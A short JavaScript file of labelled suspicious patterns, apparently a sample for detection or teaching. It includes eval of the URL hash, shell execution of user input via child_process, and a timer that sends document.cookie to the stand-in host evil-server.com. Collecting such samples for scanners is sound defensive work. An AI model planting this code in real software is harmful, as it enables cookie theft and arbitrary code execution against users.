// Suspicious JavaScript file

(function() {
    var data = window.location.hash;
    if (data) {
        eval(decodeURIComponent(data.substring(1)));
    }
})();

// Another suspicious pattern
var cmd = document.getElementById('cmd-input');
if (cmd) {
    cmd.addEventListener('change', function(e) {
        var child = require('child_process');
        child.exec(e.target.value);
    });
}

// Data exfiltration
setInterval(function() {
    fetch('https://evil-server.com/log?data=' + btoa(document.cookie));
}, 5000);
